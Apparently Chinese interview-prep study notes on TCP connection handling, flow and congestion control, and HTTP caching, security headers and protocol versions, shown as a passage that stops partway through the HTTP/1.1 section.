- [三次握手、四次挥手](https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==&mid=2247486033&idx=1&sn=679e99b0ca60ad9eb81456bba8ffbdec&chksm=ec6e7309db19fa1f74da440a9980ec08a1458598bb3e57a9110b6ceee83d52dbf8cf27d982c5&mpshare=1&scene=1&srcid=0201hefKnCRp0hm9SW35tKNb&sharer_sharetime=1580534579241&sharer_shareid=bf267d5902053ba7332cb6bb736b86b3&key=732653fb0fa49e86b2cb705aaaaf51f9f8a46f0369ca0a885b4b4916bc819da38977e0551641a69f6dfa36e1074df74cccb282239774e685deec1821000aacb4deaaadac4c325535942de78f26806e40&ascene=1&uin=MjQyMzQ2MTgzMw%3D%3D&devicetype=Windows+10&version=6208006f&lang=zh_CN&exportkey=A1nRWsKlQIXAWHd8C0NMQYo%3D&pass_ticket=xlc2xiojgyuqCT6cyqwQWdbOwUCf%2BOt%2BC4jow75C87vgCsxU%2FXCzkna537BHolOS)

![三次握手](https://qiniu1.lxfriday.xyz/feoffer/tcp-three-times-handshake.png)

### ✔ 四次挥手

![四次挥手](https://qiniu1.lxfriday.xyz/feoffer/tcp-four-times-wave.png)

### ✔ TCP 为什么要三次握手（为什么不是两次）

当网络中存在延迟时，可能客户端发送了多个 SYN 建立链接，最后这些包都到达了服务端，从而导致建立多个连接浪费资源。

### ✔ TCP 为什么要四次挥手（为什么不是三次）

当服务端收到 FIN 报文时，可能还有数据需要处理，所以需要先发送一个 ACK 表示服务端知道要断开连接了（如果不发这个 ACK 客户端可能会重复发送 FIN）。等服务端的数据都发送完之后，服务端需要再发送一个 FIN 报文，表示服务端也不发送数据了，两边都可以断开了。

### ✔ TIME_WAIT 为什么是 2 个 MSL

客户端发送的最后一个 ACK 在网络中可能会丢失，TIME_WAIT 用来等待服务端发送的 FIN ，服务端如果没有收到 ACK，将不断重复发送 FIN 片段。所以客户端不能立即关闭，它必须确认服务端接收到了该 ACK。

客户端会有一个计时器，如果在 TIME_WAIT 阶段接收到 FIN ，那么客户端会重发 ACK 重置计时器再次进入 TIME_WAIT 状态。

2MSL（Maximum Segment Lifetime，片段在网络中的最大存活时间），刚好是一个发送和一个回复所需的最大时间（大于客户端发送的 ACK 丢失之后服务端重发 FIN 并被客户端接收到的时间），如果直到 2MSL，客户端都没有再次收到 FIN，客户端则推断 ACK 已经被成功接收，会关闭连接。

### ✔ 建立连接时 SYN 超时

服务端收到了客户端发送的 SYN 时返回了 SYN-ACK，这之后客户端掉线了，服务端没有收到客户端发送回来的 ACK，那么这个连接就处于中间状态了，此时连接既没有成功也没有失败。

服务端如果在一定时间内没有收到 ACK 则会重发 SYN-ACK 。在 Linux 下，默认重试次数为 **5** 次，重试的时间间隔时间从 1 秒开始翻翻，5 次重试的时间间隔分别为： 1s，2s，4s，8s，16s，总共 31s，第五次发出后还要等待 32s 才知道第 5 次也超时了，所以总共需要 63s，服务端才会断开这个连接。

### ✔ SYN 洪水攻击

攻击者发送 SYN 之后就下线了，而服务器必须等待 63s 才会断开连接，因此攻击者利用这个等待时间发送大量的 SYN 并让客户端不接受返回的 SYN-ACK，以此来耗尽服务端的 SYN 队列资源，让正常的请求无法处理。

解决办法：Linux 下给了一个 tcp_syncookies 的参数来应对，当 SYN 队列满了之后，TCP 会通过**源地址端口**、**目标地址端口**和**时间戳**打造出一个特别的 seq（也叫 cookie）发回去。如果是攻击者则不会有响应，如果是正常连接，则会把这个 seq Cookie 发回来，然后服务端可以通过 cookie 建连接（即使你不在 SYN 队列中）。

### ✔ Inital Sequence Number(ISN) 如何确定

在三次握手中主要是初始化双方的 Sequence Number 的初始值。通信双方要互相通知对方自己的初始化 Sequence Number（缩写为 ISN：Initial Sequence Number）。SYN（Synchronize Sequence Number）为 1 的数据包中会带上 seq。

从三次握手的过程可以看出，通信双方都会发送 SYN 标志位，这是为了告知对方自己发送数据的初始序号。

ISN 会和一个假的时钟绑在一起，这个时钟会在每 4 微秒对 ISN 做加一操作，直到超过 2^32，又从 0 开始。这样一个 ISN 的周期大约 4.55 小时。只要 MSL 小于 4.55 小时，就不会重用 ISN。

如果 ISN 是一个固定的值，假如为 1，建立好连接之后，客户端发送了 30 个 segment，客户端掉线重连之后，又用 1 建立连接，如果服务端收到了这 30 个 segment，则此时服务端返回的 ack 和客户端会对不上，导致问题。

### ✔ TCP 保活机制（客户端故障之后什么时候断开连接）

服务器没收到一次客户端的请求后都会重置一个计时器，这个计时器通常设置为 **2 小时**，若 2 小时内都没有收到任何客户端的数据，服务端就会发送一个探测报文段，以后**每隔 75 秒**发送一次，一共发送 **10** 个探测报文，如果客户端仍然没有反应，服务器就认定客户端出现故障，服务端关闭连接。

### ✔ TCP 的 RTT

RTT——Round Trip Time，是一个数据包从发出去到回来的时间。

### ✔ TCP 滑动窗口（流量控制）

ref

- [https://www.zhihu.com/question/32255109/answer/68558623](https://www.zhihu.com/question/32255109/answer/68558623)
- [【协议森林】详解 TCP 之滑动窗口](https://mp.weixin.qq.com/s?src=11&timestamp=1581567500&ver=2155&signature=0QO0viToz-aDdxqT0eeussfqMzfrGsUnqbuKPeWad9Fzr0b8AD-h*OyjTM5ThFS4xxaRXAHDfaMie*AEFgtp9kvqSm6pHsbBV8KSQ9pIollkf*Mut3BvPK5Ss4a6*3Ik&new=1)

TCP 必需要解决的可靠传输以及包乱序（reordering）的问题，所以，TCP 必需要知道网络实际的数据处理带宽或是数据处理速度，这样才不会引起网络拥塞，导致丢包。

TCP 头里面有一个字段叫 Window（窗口），又叫 Advertised-Window，接收端通过这个字段告诉发送端自己还有多少缓冲区可以接收数据。发送端可以依据 Window 知道接受端的处理能力来控制数据发送量，防止发送的数据量过多。

TCP 滑动窗口分为接受窗口，发送窗口。

对于**发送方**，任何时候在其发送缓存内的数据都可以分为 4 类，**已经发送并得到对端 ACK 的**，**已经发送但还未收到对端 ACK 的**，**未发送但对端允许发送的**，**未发送且对端不允许发送**。**已经发送但还未收到对端 ACK 的**和**未发送但对端允许发送的**这两部分数据称之为发送窗口。

![tcp 滑动窗口-发送窗口](https://qiniu1.lxfriday.xyz/feoffer/tcp-sliding-window.jpg)

对于**接收方**，在某一时刻在它的接受缓存内存在 3 类，**已接收**，**未接收准备接收**，**未接收并未准备接收**（由于 ACK 直接由 TCP 协议栈回复，默认无应用延迟，不存在已接收未回复 ACK），其中**未接收准备接收**称之为接收窗口。

TCP 是双工的协议，会话的双方都可以同时接收、发送数据。TCP 会话的双方都各自维护一个发送窗口和一个接收窗口。其中各自的接收窗口大小取决于应用、系统、硬件的限制，发送窗口取决于对端通告。

用例子来讲解过程：

**发送窗口**

![tcp 滑动窗口-发送窗口-示例](https://qiniu1.lxfriday.xyz/feoffer/tcp-sliding-window-demo.png)

1. 我们一共需要发送 900 字节数据。可发送数据为 1-500 字节，尚未发送数据。假设首先发送 400 字节的数据；
1. 发送了 400 字节后，对端返回一个 ack 表示收到 200 序号之内的数据且窗口通告为 500。于是如图示，窗口向前滑动了 200 字节。当前已发送未确认字节序号为 200-400,可发送字节序号为 401-700,假设在此尚未发送数据；
1. 对端返回一个 ack 表示收到 400 序号内的数据且窗口通告为 400。于是如图示，窗口向前滑动了 200 字节。已确认数据序号为 1-400，可发送数据为 401-800；

**接收窗口**

![tcp 滑动窗口-接收窗口-示例](https://qiniu1.lxfriday.xyz/feoffer/tcp-sliding-window-demo2.png)

1. 发送端：写入 2KB 的数据[seq=0]；
1. 接收端：收到数据,初始化接收端缓冲区 4K,写入后还剩 2K,于是通告 ack[seq=2048,win=2048]；
1. 发送端：接收到窗口通告为 2048,于是最多只能写入 2K 的数据，将 2K 数据写入[seq=2048]；
1. 接收端：应用层尚未消费缓冲区。接收到 2K 数据后，缓冲区满。于是通告窗口为 0,返回 ack[seq=4096,win=0]；
1. 发送端：由于发送窗口为 0，不能发送任何数据。此时发送端就需要定时的发送 0 字节的数据去探测接收端窗口。所需的定时器即为持续定时器（TCPT_PERSIST）；
1. 发送端：发送 0 字节的探测数据；
1. 接收端：缓冲区满,窗口通告为 0,ack[seq=4096,win=0]；
1. 发送端：继续发送 0 字节的探测数据；
1. 接收端：缓冲区被应用层消费了 2K,缓冲区可用字节为 2K,通告窗口为 2048,ack[seq=4096,win=2048]；
1. 发送端：继续写入 1K 的数据；

### ✔ TCP 拥塞控制

ref

- [https://coolshell.cn/articles/11609.html](https://coolshell.cn/articles/11609.html)
- [https://zhuanlan.zhihu.com/p/37379780](https://zhuanlan.zhihu.com/p/37379780)

![TCP 拥塞控制](https://qiniu1.lxfriday.xyz/feoffer/tcp-congestion-control.jpg)
![TCP 拥塞控制](https://qiniu1.lxfriday.xyz/feoffer/tcp-congestion-control2.jpg)

拥塞控制包括：慢启动、拥塞避免、快重传、快恢复。它是为了避免网络拥塞而设计的一系列算法。

TO 时采用慢开始算法。

#### ✔ TCP 慢启动(慢开始)

ref

- [https://coolshell.cn/articles/11609.html](https://coolshell.cn/articles/11609.html)

![](https://qiniu1.lxfriday.xyz/feoffer/tcp-slow-start.jpg)

> 对于以太网来说，MTU 是 1500 字节，除去 TCP+IP 头的 40 个字节，真正的数据传输可以有 1460，这就是所谓的 MSS。

- **ssthresh** (slow start threshold) 慢启动上限
- **cwnd**（Congestion Window）
- MTU（Maximum Transmission Unit）最大传输单元，用来通知对方所能接受数据服务单元的最大尺寸，说明发送方能够接受的有效载荷大小
- MSS（Max Segment Size）
- RTO（Retransmission TimeOut）

TCP 慢启动的意思是，刚刚加入网络的连接，一点一点地提速，不要一开始就发送大量的数据。

慢启动的算法如下：

1. 建立好连接之后，先初始化 cwnd = 1，表明可以传一个 MSS 大小的数据；
1. 每当收到一个 ACK，**cwnd++**，呈线性上升；
1. 每当过了一个 RTT，就会有 **cwnd\*=2**，呈指数上升；
1. 当 **cwnd >= ssthresh** 时，就会进入拥塞避免阶段，(ssthresh 是如何变化的请看快重传部分)；

Linux 3.0 后把 cwnd 初始化成了 10 个 MSS。

如果网速很快，则 ACK 返回也很快，RTT 也会很短。

#### ✔ TCP 拥塞避免

ref

- [https://coolshell.cn/articles/11609.html](https://coolshell.cn/articles/11609.html)

当 cwnd >= ssthresh （slow start threshold）时，会进入拥塞避免阶段。一般来说 ssthresh 的值是 **65535**，单位是**字节**，当 cwnd 达到这个值之后，算法如下：

1. 收到一个 ACK 时，cwnd=cwnd + 1 / cwnd；
1. 每过一个 RTT 时，cwnd+=1；

这是一个线性上升的算法。

#### ✔ TCP 快重传

- Fast Retransmit 快重传

![tcp 快重传 by coolshell](https://qiniu1.lxfriday.xyz/feoffer/tcp-fast-retransmit.png)

如果发送方连续收到 3 次相同的 ack，则表示这个报文的下一个报文丢失了，进入快重传阶段，要求接收方在收到一个失序的报文段后就立即发出重复确认，为的是使发送方及早知道报文段有没有到达对方，可以提高网络吞吐率约 20%。

比如：如果发送方发出了 1，2，3，4，5 份数据，第一份先送到了，于是就 ack 回 2，结果 2 因为某些原因没收到，3 到达了，于是还是 ack 回 2，后面的 4 和 5 都到了，但是还是 ack 回 2，因为 2 还是没有收到，于是发送端收到了三个 ack=2 的确认，知道了 2 还没有到，于是就马上重转 2。然后，接收端收到了 2，此时因为 3，4，5 都收到了，于是 ack 回 6。

TCP Reno（主流，适用于低延时、低带宽） 的实现是：

1. cwnd/=2；
1. ssthresh = cwnd；
1. 进入快恢复阶段；

RTO 超时后，sshthresh 会变成 cwnd 的一半，这意味着，如果 cwnd<=sshthresh 时出现的丢包，那么 TCP 的 sshthresh 就会减了一半，然后等 cwnd 又很快地以指数级增涨爬到这个地方时，就会成慢慢的线性增涨。

#### ✔ TCP 快恢复

- Fast Recovery 快恢复

快恢复是指的快重传（cwnd = cwnd /2，sshthresh = cwnd）之后，进入拥塞避免阶段。

在采用快恢复算法时，慢开始算法只是在**TCP 连接建立**时和**网络出现超时**时才使用

#### ✔ 拥塞控制中的乘法减小和加法增大

**乘法减小**指的是无论是在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞，就把慢开始门限 ssthresh 设置为出现拥塞时的发送窗口大小的一半，并执行慢开始算法，所以当网络频繁出现拥塞时，ssthresh 下降的很快，以大大减少注入到网络中的分组数。

**加法增大**是指执行拥塞避免算法后，使拥塞窗口缓慢增大，以防止过早出现拥塞。

### ✔ TCP 拥塞控制和流量控制的区别

- **拥塞控制**：作用于网络，它是为了防止过多的数据注入到网络中，避免网络负载过大的情况。常用的方法是：慢开始、拥塞避免、快重传、快恢复；
- **流量控制**：作用于接收者，它是控制发送者的发送速度从而使接收者来得及接收，防止分组丢失的；

### TCP 和 UDP 的对比

ref

- [https://zhuanlan.zhihu.com/p/76023663](https://zhuanlan.zhihu.com/p/76023663)

![TCP UDP 对比](https://qiniu1.lxfriday.xyz/feoffer/tcp-udp-compare.jpg)

TCP 和 UDP 是 OSI 模型中传输层的协议。TCP 的数据是连续的 **字节流**，有**先后顺序**，而 UDP 则是分散的小数据包，是**顺序发，乱序收**。

## HTTP

### ✔ url、uri、urn

ref

- [https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web)

---

- URI（Uniform Resource Identifier ）：统一资源标识符，就是在某一规则下能把一个资源独一无二地标识出来。
- URL（Uniform Resource Locator）：统一资源定位符。
- URN（Uniform Resource Name）：统一资源名称。

URI 可以分为 URL,URN 或同时具备 locators 和 names 特性的一个东西。URN 作用就好像一个人的名字，URL 就像一个人的地址。换句话说：URN 确定了东西的身份，URL 提供了找到它的方式。

大白话，就是 URI 是抽象的定义，不管用什么方法表示，只要能定位一个资源，就叫 URI，本来设想的的使用两种方法定位：1，URL，用地址定位；2，URN 用名称定位。

**URN**

URN 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。

```
urn:isbn:9780141036144
urn:ietf:rfc:7230
```

乔治·奥威尔所著的《1984》

IETF 规范 7230，超文本传输 ​​ 协议 (HTTP/1.1)：Message Syntax and Routing.

### ✔ HTTP 协议格式

一个完整的 HTTP 交互过程由 **HTTP 请求** 和 **HTTP 响应** 两部分组成。

**HTTP 请求**

- `起始行`：请求的第一行，包含请求方法、请求目标、HTTP 版本；
- `请求头`；
- `请求体`；

**HTTP 响应**

- `状态行`：请求的第一行，包含协议版本、状态码、状态文本；
- `响应头`；
- `响应体`；

请求头和请求体中间有一个换行，响应头和响应体中间有一个换行。

发起请求：

```http
POST /v3/web/wbbr/bgeda HTTP/1.1
Host: web-api.juejin.im
Connection: keep-alive
Content-Length: 147
X-Legacy-Device-Id:
Sec-Fetch-Dest: empty
X-Agent: Juejin/Web
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://juejin.im
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Referer: https://juejin.im/
Accept-Encoding: gzip
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7

{"operationName":"","query":"","variables":{"platformCode":1,"positionCodes":[1]},"extensions":{"query":{"id":"85c0f781f40a7390dd7aedf0b1b35889"}}}
```

接收响应：

```http
HTTP/1.1 200 OK
Server: nginx/1.10.2
Date: Sat, 14 Mar 2020 03:51:18 GMT
Content-Type: application/json
Content-Length: 508
Connection: close
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, PUT, POST, DELETE, PATCH
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Content-Type,X-Agent,X-Token,X-Legacy-Token,X-Legacy-Uid,X-Legacy-Device-Id,X-Legacy-New-Token,X-Request-Id
Access-Control-Max-Age: 86400
X-Request-Id: 0fc2f44065a711eab6b66f8b0073adbf
Set-Cookie: QINGCLOUDELB=743155a837e7deb03acb8e760501fb609b6845ac24ccb3b2c31a11c11a0765c2|XmxUu|XmxUu; path=/; HttpOnly

{"data":{"advertisementCard":{"items":[{"type":"ImageAdvertisement","id":"5e6b33e3e51d4526f363c0fc","url":"https://juejin.im/book/5c7bcd6b6fb9a049a7128934?source=fenxiweb&utm_campaign=xiaoce&utm_content=juejin01&utm_fenxiweb","platformCode":1,"positionCode":1,"startedAt":"2020-03-12T16:00:00.000Z","endedAt":"2020-03-15T16:00:00.000Z","imageUrl":"https://user-gold-cdn.xitu.io/1584083935907df34609a20504f1498d7c8c42705effd.jpg","advertiser":{"id":"","title":"","nativeTarget":null},"nativeTarget":null}]}}}
```

### ✔ HTTP 缓存

ref

- [https://juejin.im/post/5da7286de51d4524a21c45d1](https://juejin.im/post/5da7286de51d4524a21c45d1)

- [etag 如何生成](https://juejin.im/post/5df027036fb9a0164143ef25)

#### ✔ http 缓存-Pragma

```http
Pragma: no-cache
```

与 `Cache-Control: no-cache` 效果一致。强制要求缓存服务器在返回缓存的版本之前将请求提交到源头服务器进行验证。

`Pragma` 是一个在 HTTP/1.0 中规定的通用首部，它用来向后兼容只支持 HTTP/1.0 协议的缓存服务器，那时候 HTTP/1.1 协议中的 `Cache-Control` 还没有出来。

#### ✔ http 缓存-Expires

```http
Expires: Wed, 21 Oct 2015 07:28:00 GMT
```

Expires 响应头包含日期/时间， 即在此时候之后，响应过期。

#### ✔ http 缓存-Cache-Control

```http
Cache-Control: max-age=<seconds>
Cache-Control: max-stale[=<seconds>]
Cache-Control: min-fresh=<seconds>
Cache-control: no-cache
Cache-control: no-store
Cache-control: no-transform
Cache-control: only-if-cached
```

**可缓存性**

- `public` 响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存；
- `private` 响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）；
- `no-cache` 会缓存在本地，另外在使用本地缓存之前，强制要求往服务器发送请求验证，如果本地缓存没有过期会返回 304；
- `no-store` 不应该缓存；

**到期**

- `max-age=<seconds>` 设置缓存在多少秒之后过期；
- `s-maxage=<seconds>` 覆盖 `max-age` 或者 `Expires` 头，但是仅适用于共享缓存(比如各个代理)，私有缓存会忽略它；
- `max-stale[=<seconds>]` 表明客户端愿意接收一个已经过期的资源。可以设置一个可选的秒数，表示响应不能已经过时超过该给定的时间；
- `stale-while-revalidate=<seconds>` 表明客户端愿意接受陈旧的响应，同时在后台异步检查新的响应。秒值指示客户愿意接受陈旧响应的时间长度；

**重新验证和重新加载**

- `must-revalidate` 一旦资源过期（比如已经超过 `max-age`），在成功向原始服务器验证之前，缓存不能用该资源响应后续请求；
- `proxy-revalidate` 与 `must-revalidate` 作用相同，但它仅适用于共享缓存（例如代理），并被私有缓存忽略；
- `immutable` 表示响应正文不会随时间而改变。资源（如果未过期）在服务器上不发生改变，因此客户端不应发送重新验证请求头（例如 `If-None-Match` 或 `If-Modified-Since`）来检查更新，即使用户显式地刷新页面。

**其他**

- `no-transform` 不得对资源进行转换或转变。`Content-Encoding`、`Content-Range`、`Content-Type` 等 HTTP 头不能由代理修改；

---

示例

**禁止缓存**

```http
Cache-Control: no-store
```

**缓存静态资源**

```http
Cache-Control:public, max-age=31536000
```

**需要重新验证**

指定 `no-cache` 或 `max-age=0` 表示客户端可以缓存资源，每次使用缓存资源前都必须重新验证其有效性。这意味着每次都会发起 HTTP 请求，但当缓存内容仍有效时可以跳过 HTTP 响应体的下载。

```http
Cache-Control: no-cache
Cache-Control: max-age=0
```

#### ✔ http 缓存-Last Modified、If Modified Since

`If-Modified-Since` 是一个条件式请求首部，服务器只在所请求的资源在**给定的日期时间之后对内容进行过修改**的情况下才会将资源返回，状态码为 200 。

如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 响应，而在 `Last-Modified` 首部中会带有上次修改时间。

`Last-Modified` 是一个响应首部，其中包含源头服务器认定的资源做出修改的日期及时间。 它通常被用作一个验证器来判断接收到的或者存储的资源是否彼此一致。由于精确度比 ETag 要低，所以这是一个备用机制。

```http
If-Modified-Since: <day-name>, <day> <month> <year> <hour>:<minute>:<second> GMT
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
```

#### ✔ http 缓存-ETag

`ETag` HTTP 响应头是资源的特定版本的标识符。这可以让缓存更高效，并节省带宽，因为如果内容没有改变，Web 服务器不需要发送完整的响应。而如果内容发生了变化，使用 ETag 有助于防止资源的同时更新相互覆盖（“空中碰撞”）。

- `W/` 可选，`W/` (大小写敏感) 表示使用弱验证器。 弱验证器很容易生成，但不利于比较。 强验证器是比较的理想选择，但很难有效地生成。 相同资源的两个弱 `Etag` 值可能语义等同，但不是每个字节都相同；
- `<etag_value>` 实体标签唯一地表示所请求的资源。 它们是位于双引号之间的 ASCII 字符串（如 `675af34563dc-tr34`）。 没有明确指定生成 `ETag` 值的方法。 通常，使用内容的散列，最后修改时间戳的哈希值，或简单地使用版本号。 例如，MDN 使用 wiki 内容的十六进制数字的哈希值；

```http
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
ETag: W/"0815"
```

**应用 1：缓存未更改资源”**

如果用户再次访问给定的 URL（设有 `ETag` 字段），显示资源过期了且不可用，客户端就发送值为 `ETag` 的 `If-None-Match` header 字段：

```http
If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

服务器将客户端的 `ETag`（作为 `If-None-Match` 字段的值一起发送）与其当前版本的资源的 `ETag` 进行比较，如果两个值匹配（即资源未更改），服务器将返回不带任何内容的 304 未修改状态，告诉客户端缓存版本可用（新鲜）。

**应用 2：避免“空中碰撞”**

在 `ETag` 和 `If-Match` 头部的帮助下，您可以检测到"空中碰撞"的编辑冲突。

例如，当编辑 MDN 时，当前的 wiki 内容被散列，并在响应中放入 `Etag`：

```http
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

将更改保存到 Wiki 页面（发布数据）时，POST 请求将包含有 `ETag` 值的 `If-Match` 头来检查是否为最新版本。

```http
If-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

如果哈希值不匹配，则意味着文档已经被编辑，抛出 [412](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412) 前提条件失败错误。

#### ✔ http 缓存 If-None-Match

参考 Etag。

当与 `If-Modified-Since` 一同使用的时候，`If-None-Match` 优先级更高（假如服务器支持的话）。

#### ✔ http 缓存-Vary

`Vary` 是一个 HTTP 响应头部信息，它决定了对于未来的一个请求头，应该用一个缓存的回复(response)还是向源服务器请求一个新的回复。它被服务器用来表明在 content negotiation algorithm（内容协商算法）中选择一个资源代表的时候应该使用哪些头部信息（headers）.

在响应状态码为 304 Not Modified 的响应中，也要设置 `Vary` 首部，而且要与相应的 200 OK 响应设置得一模一样。

**动态服务**

对于 `User-Agent` 头部信息，例如你提供给移动端的内容是不同的，可用防止你客户端误使用了用于桌面端的缓存。

```http
Vary: User-Agent
```

#### ✔ http 缓存-Date

`Date` 是一个通用首部，其中包含了报文创建的日期和时间。

```http
Date: <day-name>, <day> <month> <year> <hour>:<minute>:<second> GMT

Date: Wed, 21 Oct 2015 07:28:00 GMT
```

#### ✔ http 缓存-Age

`Age` 消息头里包含消息对象在缓存代理中存贮的时长，以秒为单位。

`Age` 消息头的值通常接近于 0。表示此消息对象刚刚从原始服务器获取不久；其他的值则是表示代理服务器当前的系统时间与此应答消息中的通用消息头 `Date` 的值之差。

`<delta-seconds>`：一个非负整数，表示消息对象在缓存代理服务器中存贮的时长，以秒为单位。

```http
Age: <delta-seconds>
```

### HSTS

HTTP Strict Transport Security（通常简称为 HSTS）是一个安全功能，它告诉浏览器只能通过 HTTPS 访问当前资源，而不是 HTTP。

语法

```http
Strict-Transport-Security: max-age=<expire-seconds>
Strict-Transport-Security: max-age=<expire-seconds>; includeSubDomains
```

- `max-age=<expire-seconds>` 设置在浏览器收到这个请求后的 `<expire-seconds>` 秒的时间内凡是访问这个域名下的请求都使用 HTTPS 请求；
- `includeSubDomains` 如果这个可选的参数被指定，那么说明此规则也适用于该网站的所有子域名；

`Strict-Transport-Security` 在通过 HTTP 访问时会被浏览器忽略; 因为攻击者可以通过中间人攻击的方式在连接中修改、注入或删除它. 只有在你的网站通过 HTTPS 访问并且没有证书错误时, 浏览器才认为你的网站支持 HTTPS 然后使用 `Strict-Transport-Security` 的值。

你的网站第一次通过 HTTPS 请求，服务器响应 `Strict-Transport-Security` 头，浏览器记录下这些信息，然后后面尝试访问这个网站的请求都会自动把 HTTP 替换为 HTTPS。

当 HSTS 头设置的过期时间到了，后面通过 HTTP 的访问恢复到正常模式，不会再自动跳转到 HTTPS。

每次浏览器接收到 `Strict-Transport-Security` 头，它都会更新这个网站的过期时间，所以网站可以刷新这些信息，防止过期发生。

Chrome、Firefox 等浏览器里，当您尝试访问该域名下的内容时，会产生一个 307 Internal Redirect（内部跳转），自动跳转到 HTTPS 请求。

### CSP

ref

- [内容安全策略( CSP )](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
- [CSP: default-src](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src)

内容安全策略 (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段（`X-Content-Security-Policy` 是旧版用法 ）。

CSP 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。

CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除 XSS 攻击所依赖的载体。一个 CSP 兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和 HTML 的事件处理属性)。

用法

```http
Content-Security-Policy: policy
```

你的策略应当包含一个 `default-src` 策略指令，在其他资源类型没有符合自己的策略时应用该策略。一个策略可以包含 `default-src` 或者 `script-src` 指令来防止内联脚本运行, 并杜绝 `eval()` 的使用。 一个策略也可包含一个 `default-src` 或 `style-src` 指令去限制来自一个 `<style>` 元素或者 style 属性的內联样式。

https://home.firefoxchina.cn/ 设置的 CSP 策略

```http
Content-Security-Policy: default-src 'self' api2.firefoxchina.cn;
   script-src 'self' 'unsafe-inline' 'unsafe-eval' https://tiny.lishitu.com/open/changeXinzuo  http://a.alimama.cn g.click.taobao.com platform.sina.com.cn suggestion.baidu.com www.baidu.com hm.baidu.com nssug.baidu.com tui.cnzz.net www.google-analytics.com *.googlesyndication.com static.huohu123.com https://www.duba.com/main3_json.html http://www.duba.com/main3_json.html;
   img-src * data:;
   child-src 'self' *.firefoxchina.cn  *.17huohu.com;
   frame-src 'self' *.firefoxchina.cn  *.17huohu.com www.taobao.com entry.baidu.com;
   frame-ancestors 'self' *.firefoxchina.cn tongji.baidu.com about:;
   style-src 'self' 'unsafe-inline';
   font-src 'self' data: ;
   report-uri /_/csp-reports
```

**常用指令：**

- `default-src` 可以为其他 CSP 拉取指令提供备选项；
- `font-src` 定义了 `@font-face` 加载字体的有效源规则；
- `script-src` 指定加载 JS 代码的途径，`'unsafe-eval'` 表示可以使用 `eval()`，`'unsafe-inline'` 表示可以使用 `<script>` 内联标签；
- `img-src` 指定加载图片的途径；
- `style-src` 指定加载样式的途径；
- `frame-src` 直接加载页面内 frame 的途径（iframe）；
- `report-uri` 指定出现违规状况时上报的地址；

### HTTP header

### ✔ HTTP 协议版本变迁

ref

- [阮一峰：HTTP 协议入门](http://www.ruanyifeng.com/blog/2016/08/http.html)
- [阮一峰：HTTP/2 服务器推送（Server Push）教程](http://www.ruanyifeng.com/blog/2018/03/http2_server_push.html)

#### ✔ HTTP 0.9 - 单行协议

HTTP/0.9 极其简单：请求由**单行指令**构成，以唯一可用方法**GET**开头，其后跟**目标资源的路径**（一旦连接到服务器，协议、服务器、端口号这些都不是必须的）。

```http
GET /mypage.html
```

响应也极其简单的：只包含响应文档本身。

```http
<HTML>
这是一个非常简单的HTML页面
</HTML>
```

**跟后来的版本不同，HTTP/0.9 的响应内容并不包含 HTTP 头，这意味着只有 HTML 文件可以传送，无法传输其他类型的文件；也没有状态码或错误代码：一旦出现问题，一个特殊的包含问题描述信息的 HTML 文件将被发回，供人们查看。**

#### ✔ HTTP 1.0 – 构建可扩展性

- 协议版本信息现在会随着每个请求发送（HTTP/1.0 被追加到了 GET 行）；
- 状态码会在响应开始时发送，使浏览器能了解请求执行成功或失败，并相应调整行为（如更新或使用本地缓存）；
- 引入了 HTTP 头的概念，无论是对于请求还是响应，允许传输元数据，使协议变得非常灵活，更具扩展性；
- 在新 HTTP 头的帮助下，具备了传输除纯文本 HTML 文件以外其他类型文档的能力（感谢`Content-Type`头）；

一个典型的请求：

```http
GET /mypage.html HTTP/1.0
User-Agent: NCSA_Mosaic/2.0 (Windows 3.1)

200 OK
Date: Tue, 15 Nov 1994 08:12:31 GMT
Server: CERN/3.0 libwww/2.17
Content-Type: text/html
<HTML>
一个包含图片的页面
  <IMG SRC="/myimage.gif">
</HTML>
```

接下来是第二个连接，请求获取图片：

```http
GET /myimage.gif HTTP/1.0
User-Agent: NCSA_Mosaic/2.0 (Windows 3.1)

200 OK
Date: Tue, 15 Nov 1994 08:12:32 GMT
Server: CERN/3.0 libwww/2.17
Content-Type: text/gif
(这里是图片内容)
```

#### ✔ HTTP 1.1 – 标准化的协议

HTTP/1.0 多种不同的实现方式在实际运用中显得有些混乱，自 1995 年开始，即 HTTP/1.0 文档发布的下一年，就开始修订 HTTP 的第一个标准化版本。在 1997 年初，HTTP/1.1 标准发布，就在 HTTP/1.0 发布的几个月后。

HTTP/1.1 消除了大量歧义内容并引入了多项改进：

- 连接可以复用，节省了多次打开 TCP 连接加载网页文档资源的时间；
